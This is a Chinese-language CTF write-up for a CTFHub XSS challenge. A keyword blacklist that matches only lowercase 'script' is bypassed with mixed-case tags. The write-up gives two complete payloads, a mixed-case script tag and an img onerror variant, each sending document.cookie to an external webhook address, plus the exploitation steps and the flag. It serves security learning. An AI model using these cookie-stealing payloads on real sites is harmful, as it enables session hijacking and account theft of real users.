---
title: CTFHub-XSS-过滤关键词 Writeup
date: 2026-10-22
category: web
tags: [CTFHub, XSS, web]
---
## 题目分析

题目存在XSS注入点，后端设置了关键词黑名单，会过滤小写的 script，直接提交 <script> 标签的payload会被拦截。
但是过滤逻辑仅仅是简单的字符串匹配，没有统一转小写/大写再检测，不做标签规范化处理，因此可以使用大小写混合的方式绕过 script 关键词过滤。
同时这道题是需要访问Bot（管理员）页面，窃取管理员的Cookie，不是简单弹窗，需要把Cookie外带到我们自己的Webhook接收地址。

## Payload尝试与思路

1. 直接写 <script> 被拦截，因为匹配到小写script关键词

2. 尝试大小写混淆标签 <ScRiPt> 绕过黑名单检测

3. 利用 new Image() 构造请求，将 document.cookie 携带在URL参数中发送到我们的webhook地址

4. 使用 encodeURIComponent() 对Cookie编码，防止Cookie里面特殊字符破坏URL

✅ 可用Payload（script大小写绕过版本）
<ScRiPt>new Image().src="https://webhooksite.net/fb41358b-97e4-404d-8fef-bb05b1b388e7/?c="+encodeURIComponent(document.cookie)</ScRiPt>
✅ 备选Payload（img+onerror 事件绕过，不需要script标签）
<ImG sRc=x OnErRoR="new Image().src='https://play.hook0.com/in/c_Dfoz5hHrT7wOGIPeqaqDoNAr8h8/?c='+encodeURIComponent(document.cookie)">
两个payload都可以，一个是混淆script标签，一个是使用img事件，都绕开了过滤。

## 利用流程

1. 准备好Webhook接收地址（图里用了webhooksite.net / hook0），用来接收Bot发来的Cookie

2. 将构造好的XSS payload提交到输入框，发给Bot访问

3. Bot（管理员）访问页面，页面解析执行JS代码，自动发起请求，带上管理员Cookie访问我们的Webhook

4. 在Webhook后台收到Bot的Cookie，从Cookie中提取得到Flag：ctfhub{549382fbfc0e901c420e7124}

## Flag
ctfhub{549382fbfc0e901c420e7124}
